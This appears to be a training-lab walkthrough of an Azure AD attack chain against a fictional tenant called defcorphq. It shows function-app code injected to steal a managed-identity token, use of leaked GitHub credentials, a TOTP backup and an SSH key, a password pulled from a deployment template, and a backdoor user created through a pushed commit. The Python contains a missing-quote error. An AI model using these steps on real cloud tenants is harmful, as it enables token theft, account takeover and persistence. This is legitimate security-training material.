## Objective 19 ***Part of - Kill Chain - 4***

```
- Using the secrets from the application backup found in the 'defcorpcodebackup' storage account, make changes to a GitHub account to push changes to a Function App.
- Abuse the managed identity of the function app to extract credentials for a user from deployment history.
- Extract a SSH key for a GitHub account from the 'codebackup' storage account.
- Use the SSH key to access the GitHub account, modify code and trigger a function app that uses the modified code. 
```

- Recall that we extract `app.zip` from one of the storage accounts. One of the files contained GitHub credentials for two users **`jenniferazad`** and **`laurenazad`** . However both users have 2FA
- Using `authenticator.txt` that contains backup of a GitHub's TOTP for **`laurenazad``**
 ![test](/img/obj19.png "Enumeration")
- Once accessing to github account there is an app for triggering http requests to develops an app.
 ![test](/img/obj19a.png "Enumeration")
- Change the code on the github account as below and commit changes.
```python
import logging,os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
  logging.info('Python HTTP trigger function processed a request.')
  IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT]
  IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
  cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
  val = os.popen(cmd).read()
  return func.HttpResponse(val, status_code=200)
```
- Retrieve the `access_token` and `client_id` parameters
 ![test](/img/obj19a.png "Enumeration")

- Authenticate with retrieved access_token
```powershell
$accesstoken = 'eyJ0xE...'
Connect-AzAccount -AccessToken $accesstoken -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29
```
- List accesable resources;
```powershell
Get-AzResourceGroup
```
 ![test](/img/obj19c.png "Enumeration")

- Check if the managed identity can read any deployment from the resource group:
```powershell
Get-AzResourceGroupDeployment -ResourceGroupName SAP
```
 ![test](/img/obj19d.png "Enumeration")

- Save the deployment template locally. 
```powershell
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
(cat C:\AzAD\Tools\stevencking_defcorphq.onmicrosoft.com.sapsrv.json |ConvertFromJson |select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
```
 ![test](/img/obj19e.png "Enumeration")

- Disconnect from the existing authentication as the managed identity and connect as the user Steven and check if the user has access to any Azure resource
```powershell
Disconnect-AzAccount
$password = ConvertTo-SecureString '@@#^(YanuGFASF569*8' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('stevencking@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $creds
```
- List accessable resources with Steven credentials
```powershell
Get-AzResource
```
- The error shown down below in the screenshot means that the user doesn't have access to list containers in the storage account. Let's try to storage explorer and check if we can access any container or blob using that.
 ![test](/img/obj19f.png "Enumeration")
 ![test](/img/obj19g.png "Enumeration")

- Use the private key to access `jenniferazad`'s account on github. 
```powershell
mkdir C:\Users\studentx\.ssh
copy C:\Users\studentx\Downloads\id_rsa c:\Users\studentx\.ssh
ssh -T git@github.com
<provide the credentials>
<provide the credentials>
git clone git@github.com:DefCorp/CreateUsers.git
```
The README of this mentions that it can be used for **creating users** ***in DefCorphq tenant for accessing Enterprise Applications***
```powershell
cd CreateUsers
mkdir studentx
copy C:\AzAD\Tools\CreateUsers\Example\user.json C:\AzAD\Tools\CreateUsers\studentx\user.json
notepad user.json
```

user.json
```json
{
  "accountEnabled": true,
  "displayName": "studentx",
  "mailNickName": "studentx",
  "userPrincipalName": "studentx@defcorphq.onmicrosoft.com",
  "passwordProfile": {
    "forceChangePasswordNextSignIn": false,
    "password": "StudentxPassword@123"
  }
}
```
- Commit the changes 
```powershell
git add . 
git config --global user.email "81172144+jenniferazad@users.noreply.github.com"
git config --global user.name "jenniferazad"
git commit -m "Update"
git push
```
- Browse to the function app URL to trigger the continuous deployment.
 ![test](/img/obj19h.png "Enumeration")
